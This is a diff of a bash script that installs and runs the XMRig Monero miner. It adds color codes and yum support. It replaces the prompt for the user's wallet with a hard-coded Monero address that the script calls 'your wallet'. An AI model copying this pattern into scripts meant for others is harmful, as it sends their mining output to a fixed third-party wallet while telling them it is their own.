@@ -4,9 +4,27 @@
 # "Connect your rig to the ATM"
 # ============================================================
 
+# Colors
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+NC='\033[0m'
+
 echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
 echo -e "${PURPLE}           ⛏️ NINURTA MINING RIG SETUP${NC}"
 echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
+echo ""
+
+# ============================================================
+# YOUR XMR WALLET (Already configured!)
+# ============================================================
+
+XMR_WALLET="44osUR6e9UjePWUQhavLNYTY7JSzwZMN6249AdnjbwmtXtirsjDiGcejCjJkoTst2BGD3NaLrtpzNENsc6AsZ9AGKWTx7YZ"
+
+echo -e "${GREEN}✅ Wallet: ${XMR_WALLET:0:20}...${XMR_WALLET: -10}${NC}"
 echo ""
 
 # ============================================================
@@ -20,18 +38,18 @@ if command -v xmrig &> /dev/null; then
 else
     echo -e "${YELLOW}⚠️  xmrig not found. Installing...${NC}"
     
-    # Detect OS
     if [[ "$OSTYPE" == "linux-gnu"* ]]; then
         echo -e "${CYAN}🐧 Detected Linux${NC}"
         
-        # Ubuntu/Debian
         if command -v apt &> /dev/null; then
             sudo apt update -y
             sudo apt install -y git cmake make g++
             sudo apt install -y libuv1-dev
+        elif command -v yum &> /dev/null; then
+            sudo yum install -y git cmake make gcc-c++
+            sudo yum install -y libuv-devel
         fi
         
-        # Clone and build
         cd ~/
         git clone https://github.com/xmrig/xmrig.git
         cd xmrig
@@ -50,33 +68,17 @@ else
     else
         echo -e "${RED}❌ Unsupported OS${NC}"
         echo -e "${YELLOW}Download from: https://github.com/xmrig/xmrig/releases${NC}"
+        exit 1
     fi
 fi
 
 echo ""
 
 # ============================================================
-# Step 2: Setup wallet address
+# Step 2: Create config with YOUR wallet
 # ============================================================
 
-echo -e "${CYAN}💳 Step 2: Configure wallet address...${NC}"
-
-read -p "Enter your Monero (XMR) wallet address: " XMR_WALLET
-
-if [ -z "$XMR_WALLET" ]; then
-    echo -e "${RED}❌ No wallet address provided${NC}"
-    echo -e "${YELLOW}Get a wallet from: https://www.getmonero.org/downloads/${NC}"
-    exit 1
-fi
-
-echo -e "${GREEN}✅ Wallet: ${XMR_WALLET:0:20}...${NC}"
-echo ""
-
-# ============================================================
-# Step 3: Create config
-# ============================================================
-
-echo -e "${CYAN}⚙️  Step 3: Creating config...${NC}"
+echo -e "${CYAN}⚙️  Step 2: Creating config with your wallet...${NC}"
 
 cat > ~/xmrig_config.json << EOF
 {
@@ -101,6 +103,18 @@ echo -e "${GREEN}✅ Config created at ~/xmrig_config.json${NC}"
 echo ""
 
 # ============================================================
+# Step 3: Show wallet info
+# ============================================================
+
+echo -e "${CYAN}💳 Step 3: Wallet Information${NC}"
+echo -e "${YELLOW}Your Monero Wallet:${NC}"
+echo -e "${CYAN}$XMR_WALLET${NC}"
+echo ""
+echo -e "${YELLOW}Check your balance at:${NC}"
+echo -e "${CYAN}https://xmrchain.net/address/$XMR_WALLET${NC}"
+echo ""
+
+# ============================================================
 # Step 4: Start mining
 # ============================================================
 
@@ -114,10 +128,12 @@ xmrig -c ~/xmrig_config.json
 # 📌 NOTES
 # ============================================================
 # 
+# Your wallet is already configured!
+# 
 # To start mining manually:
 #   xmrig -c ~/xmrig_config.json
 # 
 # To check earnings:
-#   curl https://xmrchain.net/api/address/YOUR_WALLET
+#   curl https://xmrchain.net/api/address/$XMR_WALLET
 # 
 # ============================================================
